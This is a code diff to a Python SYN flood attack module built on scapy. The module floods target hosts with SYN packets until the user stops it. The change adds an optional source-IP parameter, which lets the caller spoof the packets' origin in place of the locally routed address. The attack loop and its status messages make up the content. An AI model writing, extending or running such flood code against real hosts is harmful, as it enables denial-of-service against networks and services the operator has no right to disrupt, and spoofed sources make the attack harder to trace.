@@ -14,7 +14,7 @@ flood it with syn requests infinitely, until manually halted by the user.
 """
 
 
-def run(targets):
+def run(targets, src_ip=None):
     # updates to the client
     print("Running SYN flood attack on specified target(s): " + str(targets))
     print("Processing ...")
@@ -26,7 +26,8 @@ def run(targets):
         print('Press Ctrl+C to finish early.')
         for target_ip in targets:
             # get source ip using scapy tool
-            src_ip = conf.route.route(target_ip)[1]
+            if not src_ip:
+                src_ip = conf.route.route(target_ip)[1]
             dest_ip = target_ip
 
             """
@@ -44,7 +45,8 @@ def run(targets):
     else:
         # get source ip using scapy tool
         dest_ip = targets.pop()
-        src_ip = conf.route.route(dest_ip)[1]
+        if not src_ip:
+            src_ip = conf.route.route(dest_ip)[1]
         print('Single host will be continually flooded, press Ctrl+C to finish attack.')
 
         """
